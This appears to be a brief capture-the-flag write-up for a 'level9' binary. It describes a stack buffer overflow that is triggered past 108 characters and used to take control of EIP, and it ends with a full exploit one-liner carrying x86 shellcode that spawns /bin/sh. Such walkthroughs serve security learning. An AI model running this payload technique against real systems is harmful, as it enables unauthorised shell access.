We can se that the programm crash after 108 characters as argument.
With 112 the segfault occure when the program try to `move the value of the address of $eax in $edx, suposed to be called later. But if we filled the buffer with 'A' no value correspond to 41414141.
If we overwrite this adress with 108 + the adress of the start of our string,
programm segfault and we can see tha eip has been modified. Now that we have control of eip we just need to modify it so it point to our shellcode.

$> ./level9 `python -c "print '\x0c\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'"`
